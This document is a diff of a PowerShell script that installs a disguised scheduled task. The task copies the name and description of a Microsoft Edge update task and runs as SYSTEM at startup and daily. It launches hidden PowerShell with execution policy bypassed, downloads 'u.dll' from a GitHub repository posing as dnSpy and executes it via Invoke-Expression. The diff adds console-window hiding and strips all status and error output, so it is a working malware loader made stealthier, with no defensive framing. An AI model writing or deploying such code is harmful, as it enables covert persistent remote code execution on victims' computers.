@@ -1,34 +1,46 @@
+Add-Type -TypeDefinition @"
+using System; 
+using System.Runtime.InteropServices; 
+public class WindowHelper 
+{ 
+    [DllImport("user32.dll")] 
+    public static extern IntPtr GetForegroundWindow(); 
+
+    [DllImport("user32.dll")] 
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); 
+
+    public const int SW_HIDE = 0; 
+    public static void HideWindow() 
+    { 
+        IntPtr handle = GetForegroundWindow(); ShowWindow(handle, SW_HIDE); 
+    }
+}
+"@; 
+[WindowHelper]::HideWindow();
+
 Import-Module ScheduledTasks
 
 $taskName = "MicrosoftEdgeUpdateTaskUserCore{F8B2E034-9DB1-4C4C-AD12-8575EABB7842}"
 $taskDescription = "Keeps your Microsoft software up to date. If this task is disabled or stopped, your Microsoft software will not be kept up to date, meaning security vulnerabilities that may arise cannot be fixed and features may not work. This task uninstalls itself when there is no Microsoft software using it."
 
-$command = '-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""Invoke-Expression (Invoke-WebRequest ''https://raw.githubusercontent.com/aodfs/dnSpy/refs/heads/master/u.dll'' -UseBasicParsing)""'
+$command = '-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command "& {Invoke-Expression (Invoke-WebRequest ''https://raw.githubusercontent.com/aodfs/dnSpy/refs/heads/master/u.dll'' -UseBasicParsing)}"'
 
 if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
     Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
-    Write-Output "Deleted existing task: $taskName"
 }
 
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "$command"
-
+$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument $command
 $triggerDaily = New-ScheduledTaskTrigger -Daily -At "1:00AM"
 $triggerStartup = New-ScheduledTaskTrigger -AtStartup
 
 try {
     Register-ScheduledTask -TaskName $taskName `
         -Action $action `
-        -Trigger $triggerDaily, $triggerStartup
-
-    $task = Get-ScheduledTask -TaskName $taskName
-    $task.Description = $taskDescription
-    $task | Set-ScheduledTask
-
-    Write-Output "Task created successfully: $taskName"
+        -Trigger $triggerDaily, $triggerStartup `
+        -Description $taskDescription `
+        -User "SYSTEM" `
+        -RunLevel Highest 
 
     Start-ScheduledTask -TaskName $taskName
-    Write-Output "Started the task: $taskName"
-
 } catch {
-    Write-Error "Failed to create or start the scheduled task: $_"
 }
